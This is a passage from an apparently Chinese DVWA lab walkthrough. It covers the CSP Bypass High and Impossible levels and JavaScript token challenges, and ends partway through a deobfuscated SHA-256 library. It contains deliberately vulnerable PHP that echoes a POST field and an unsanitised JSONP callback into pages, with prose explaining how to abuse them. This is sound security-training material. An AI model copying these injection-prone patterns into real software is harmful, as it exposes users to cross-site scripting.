	"</span> <span class="token operator">.</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'include'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"
"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token variable">$page</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'body'</span> <span class="token punctuation">]</span> <span class="token operator">.=</span> <span class="token string single-quoted-string">'
&lt;form name="csp" method="POST"&gt;
	&lt;p&gt;The page makes a call to '</span> <span class="token operator">.</span> <span class="token constant">DVWA_WEB_PAGE_TO_ROOT</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;
	&lt;p&gt;1+2+3+4+5=&lt;span id="answer"&gt;&lt;/span&gt;&lt;/p&gt;
	&lt;input type="button" id="solve" value="Solve the sum" /&gt;
&lt;/form&gt;

&lt;script src="source/high.js"&gt;&lt;/script&gt;
'</span><span class="token punctuation">;</span>


</code></pre> 
<pre><code class="prism language-javascript"><span class="token keyword">function</span> <span class="token function">clickButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">var</span> s <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    s<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"source/jsonp.php?callback=solveSum"</span><span class="token punctuation">;</span>
    document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">solveSum</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"answer"</span> <span class="token keyword">in</span> obj<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"answer"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> obj<span class="token punctuation">[</span><span class="token string">'answer'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">var</span> solve_button <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span> <span class="token punctuation">(</span><span class="token string">"solve"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span>solve_button<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	solve_button<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"click"</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
		<span class="token function">clickButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre> 
<blockquote></blockquote> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: application/json; charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">array_key_exists</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"callback"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
	<span class="token variable">$callback</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'callback'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
	<span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$outp</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"answer"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token variable">$callback</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"("</span><span class="token operator">.</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$outp</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>jsonp.php接受callback参数的，源代码中一旦点击solve即向jsonp.php发送callback为solveSum，jsonp.php返回solveSum({answer:15})触发js的solveSum函数获取15并嵌入页面。因此可以利用include接收内容，调用jsonp.php进行弹窗。</p> 
</blockquote> 
<h3><a id="4Impossible_1912"></a>4、Impossible</h3> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: application/json; charset=UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$outp</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"answer"</span> <span class="token operator">=&gt;</span> <span class="token string double-quoted-string">"15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">echo</span> <span class="token string double-quoted-string">"solveSum ("</span><span class="token operator">.</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$outp</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>

</code></pre> 
<blockquote> 
 <p>直接将返回限制死为solveSum。</p> 
</blockquote> 
<h2><a id="JavaScript_1927"></a>十三、JavaScript</h2> 
<h3><a id="1Low_1928"></a>1、Low</h3> 
<p><img src="https://images2.imgbox.com/54/a3/l8yECzcz_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/d9/cc/edVKrn7f_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/df/2f/gsRJpJdP_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>这里的token是前端利用加密生成的。</p> 
</blockquote> 
<h3><a id="2Medium_1936"></a>2、Medium</h3> 
<p><img src="https://images2.imgbox.com/7b/79/qWCnB6KE_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/b3/e7/clO7XEF4_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>token只是用了换掉字符串顺序+XX的方法生成</p> 
</blockquote> 
<h3><a id="3High_1943"></a>3、High</h3> 
<p><img src="https://images2.imgbox.com/70/bc/byTdusEk_o.png" alt="在这里插入图片描述"></p> 
<blockquote> 
 <p>JS混淆了，上百度找个解密工具</p> 
</blockquote> 
<pre><code class="prism language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token string">'use strict'</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token constant">ERROR</span> <span class="token operator">=</span> <span class="token string">'input is invalid type'</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token constant">WINDOW</span> <span class="token operator">=</span> <span class="token keyword">typeof</span> window <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> root <span class="token operator">=</span> <span class="token constant">WINDOW</span> <span class="token operator">?</span> window <span class="token operator">:</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span><span class="token constant">JS_SHA256_NO_WINDOW</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token constant">WINDOW</span> <span class="token operator">=</span> <span class="token boolean">false</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">var</span> <span class="token constant">WEB_WORKER</span> <span class="token operator">=</span> <span class="token operator">!</span><span class="token constant">WINDOW</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> self <span class="token operator">===</span> <span class="token string">'object'</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token constant">NODE_JS</span> <span class="token operator">=</span> <span class="token operator">!</span>root<span class="token punctuation">.</span><span class="token constant">JS_SHA256_NO_NODE_JS</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> process <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> process<span class="token punctuation">.</span>versions <span class="token operator">&amp;&amp;</span> process<span class="token punctuation">.</span>versions<span class="token punctuation">.</span>node<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NODE_JS</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        root <span class="token operator">=</span> global
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">WEB_WORKER</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        root <span class="token operator">=</span> self
    <span class="token punctuation">}</span>
    <span class="token keyword">var</span> <span class="token constant">COMMON_JS</span> <span class="token operator">=</span> <span class="token operator">!</span>root<span class="token punctuation">.</span><span class="token constant">JS_SHA256_NO_COMMON_JS</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> module <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> module<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token constant">AMD</span> <span class="token operator">=</span> <span class="token keyword">typeof</span> define <span class="token operator">===</span> <span class="token string">'function'</span> <span class="token operator">&amp;&amp;</span> define<span class="token punctuation">.</span>amd<span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token constant">ARRAY_BUFFER</span> <span class="token operator">=</span> <span class="token operator">!</span>root<span class="token punctuation">.</span><span class="token constant">JS_SHA256_NO_ARRAY_BUFFER</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">typeof</span> ArrayBuffer <span class="token operator">!==</span> <span class="token string">'undefined'</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token constant">HEX_CHARS</span> <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token constant">EXTRA</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2147483648</span><span class="token punctuation">,</span> <span class="token number">8388608</span><span class="token punctuation">,</span> <span class="token number">32768</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token constant">SHIFT</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token constant">K</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x428a2f98</span><span class="token punctuation">,</span> <span class="token number">0x71374491</span><span class="token punctuation">,</span> <span class="token number">0xb5c0fbcf</span><span class="token punctuation">,</span> <span class="token number">0xe9b5dba5</span><span class="token punctuation">,</span> <span class="token number">0x3956c25b</span><span class="token punctuation">,</span> <span class="token number">0x59f111f1</span><span class="token punctuation">,</span> <span class="token number">0x923f82a4</span><span class="token punctuation">,</span> <span class="token number">0xab1c5ed5</span><span class="token punctuation">,</span> <span class="token number">0xd807aa98</span><span class="token punctuation">,</span> <span class="token number">0x12835b01</span><span class="token punctuation">,</span> <span class="token number">0x243185be</span><span class="token punctuation">,</span> <span class="token number">0x550c7dc3</span><span class="token punctuation">,</span> <span class="token number">0x72be5d74</span><span class="token punctuation">,</span> <span class="token number">0x80deb1fe</span><span class="token punctuation">,</span> <span class="token number">0x9bdc06a7</span><span class="token punctuation">,</span> <span class="token number">0xc19bf174</span><span class="token punctuation">,</span> <span class="token number">0xe49b69c1</span><span class="token punctuation">,</span> <span class="token number">0xefbe4786</span><span class="token punctuation">,</span> <span class="token number">0x0fc19dc6</span><span class="token punctuation">,</span> <span class="token number">0x240ca1cc</span><span class="token punctuation">,</span> <span class="token number">0x2de92c6f</span><span class="token punctuation">,</span> <span class="token number">0x4a7484aa</span><span class="token punctuation">,</span> <span class="token number">0x5cb0a9dc</span><span class="token punctuation">,</span> <span class="token number">0x76f988da</span><span class="token punctuation">,</span> <span class="token number">0x983e5152</span><span class="token punctuation">,</span> <span class="token number">0xa831c66d</span><span class="token punctuation">,</span> <span class="token number">0xb00327c8</span><span class="token punctuation">,</span> <span class="token number">0xbf597fc7</span><span class="token punctuation">,</span> <span class="token number">0xc6e00bf3</span><span class="token punctuation">,</span> <span class="token number">0xd5a79147</span><span class="token punctuation">,</span> <span class="token number">0x06ca6351</span><span class="token punctuation">,</span> <span class="token number">0x14292967</span><span class="token punctuation">,</span> <span class="token number">0x27b70a85</span><span class="token punctuation">,</span> <span class="token number">0x2e1b2138</span><span class="token punctuation">,</span> <span class="token number">0x4d2c6dfc</span><span class="token punctuation">,</span> <span class="token number">0x53380d13</span><span class="token punctuation">,</span> <span class="token number">0x650a7354</span><span class="token punctuation">,</span> <span class="token number">0x766a0abb</span><span class="token punctuation">,</span> <span class="token number">0x81c2c92e</span><span class="token punctuation">,</span> <span class="token number">0x92722c85</span><span class="token punctuation">,</span> <span class="token number">0xa2bfe8a1</span><span class="token punctuation">,</span> <span class="token number">0xa81a664b</span><span class="token punctuation">,</span> <span class="token number">0xc24b8b70</span><span class="token punctuation">,</span> <span class="token number">0xc76c51a3</span><span class="token punctuation">,</span> <span class="token number">0xd192e819</span><span class="token punctuation">,</span> <span class="token number">0xd6990624</span><span class="token punctuation">,</span> <span class="token number">0xf40e3585</span><span class="token punctuation">,</span> <span class="token number">0x106aa070</span><span class="token punctuation">,</span> <span class="token number">0x19a4c116</span><span class="token punctuation">,</span> <span class="token number">0x1e376c08</span><span class="token punctuation">,</span> <span class="token number">0x2748774c</span><span class="token punctuation">,</span> <span class="token number">0x34b0bcb5</span><span class="token punctuation">,</span> <span class="token number">0x391c0cb3</span><span class="token punctuation">,</span> <span class="token number">0x4ed8aa4a</span><span class="token punctuation">,</span> <span class="token number">0x5b9cca4f</span><span class="token punctuation">,</span> <span class="token number">0x682e6ff3</span><span class="token punctuation">,</span> <span class="token number">0x748f82ee</span><span class="token punctuation">,</span> <span class="token number">0x78a5636f</span><span class="token punctuation">,</span> <span class="token number">0x84c87814</span><span class="token punctuation">,</span> <span class="token number">0x8cc70208</span><span class="token punctuation">,</span> <span class="token number">0x90befffa</span><span class="token punctuation">,</span> <span class="token number">0xa4506ceb</span><span class="token punctuation">,</span> <span class="token number">0xbef9a3f7</span><span class="token punctuation">,</span> <span class="token number">0xc67178f2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token constant">OUTPUT_TYPES</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'hex'</span><span class="token punctuation">,</span> <span class="token string">'array'</span><span class="token punctuation">,</span> <span class="token string">'digest'</span><span class="token punctuation">,</span> <span class="token string">'arrayBuffer'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> blocks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span><span class="token constant">JS_SHA256_NO_NODE_JS</span> <span class="token operator">||</span> <span class="token operator">!</span>Array<span class="token punctuation">.</span>isArray<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        Array<span class="token punctuation">.</span><span class="token function-variable function">isArray</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token class-name">Object</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'[object Array]'</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">ARRAY_BUFFER</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>root<span class="token punctuation">.</span><span class="token constant">JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW</span> <span class="token operator">||</span> <span class="token operator">!</span>ArrayBuffer<span class="token punctuation">.</span>isView<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        ArrayBuffer<span class="token punctuation">.</span><span class="token function-variable function">isView</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token keyword">typeof</span> obj <span class="token operator">===</span> <span class="token string">'object'</span> <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>buffer <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>buffer<span class="token punctuation">.</span>constructor <span class="token operator">===</span> ArrayBuffer
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">var</span> <span class="token function-variable function">createOutputMethod</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">outputType<span class="token punctuation">,</span> is224</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Sha256</span><span class="token punctuation">(</span>is224<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">[</span>outputType<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token function-variable function">createMethod</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">is224</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">var</span> method <span class="token operator">=</span> <span class="token function">createOutputMethod</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">,</span> is224<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token constant">NODE_JS</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                method <span class="token operator">=</span> <span class="token function">nodeWrap</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span> is224<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            method<span class="token punctuation">.</span><span class="token function-variable function">create</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Sha256</span><span class="token punctuation">(</span>is224<span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            method<span class="token punctuation">.</span><span class="token function-variable function">update</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token constant">OUTPUT_TYPES</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">var</span> type <span class="token operator">=</span> <span class="token constant">OUTPUT_TYPES</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                method<span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">createOutputMethod</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> is224<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> method
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token function-variable function">nodeWrap</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">method<span class="token punctuation">,</span> is224</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"require('crypto')"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> Buffer <span class="token operator">=</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"require('buffer').Buffer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> algorithm <span class="token operator">=</span> is224 <span class="token operator">?</span> <span class="token string">'sha224'</span> <span class="token operator">:</span> <span class="token string">'sha256'</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> <span class="token function-variable function">nodeMethod</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">message</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> message <span class="token operator">===</span> <span class="token string">'string'</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span>algorithm<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>message<span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>message <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> message <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token constant">ERROR</span><span class="token punctuation">)</span>
                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>message<span class="token punctuation">.</span>constructor <span class="token operator">===</span> ArrayBuffer<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                            message <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>Array<span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">||</span> ArrayBuffer<span class="token punctuation">.</span><span class="token function">isView</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span> <span class="token operator">||</span> message<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Buffer<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span>algorithm<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">return</span> <span class="token function">method</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> nodeMethod
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token function-variable function">createHmacOutputMethod</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">outputType<span class="token punctuation">,</span> is224</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">key<span class="token punctuation">,</span> message</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">HmacSha256</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> is224<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span><span class="token punctuation">[</span>outputType<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> <span class="token function-variable function">createHmacMethod</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">is224</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">var</span> method <span class="token operator">=</span> <span class="token function">createHmacOutputMethod</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">,</span> is224<span class="token punctuation">)</span><span class="token punctuation">;</span>
            method<span class="token punctuation">.</span><span class="token function-variable function">create</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">HmacSha256</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> is224<span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            method<span class="token punctuation">.</span><span class="token function-variable function">update</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">key<span class="token punctuation">,</span> message</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">return</span> method<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>message<span class="token punctuation">)</span>
            <span class="token punctuation">}</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token constant">OUTPUT_TYPES</span><span class="token punctuation">.</span>length<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">var</span> type <span class="token operator">=</span> <span class="token constant">OUTPUT_TYPES</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
                method<span class="token punctuation">[</span>type<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">createHmacOutputMethod</span><span class="token punctuation">(</span>type<span class="token punctuation">,</span> is224<span class="token punctuation">)</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> method
        <span class="token punctuation">}</span><span class="token punctuation">;</span>

    <span class="token keyword">function</span> <span class="token function">Sha256</span><span class="token punctuation">(</span><span class="token parameter">is224<span class="token punctuation">,</span> sharedMemory</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>sharedMemory<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
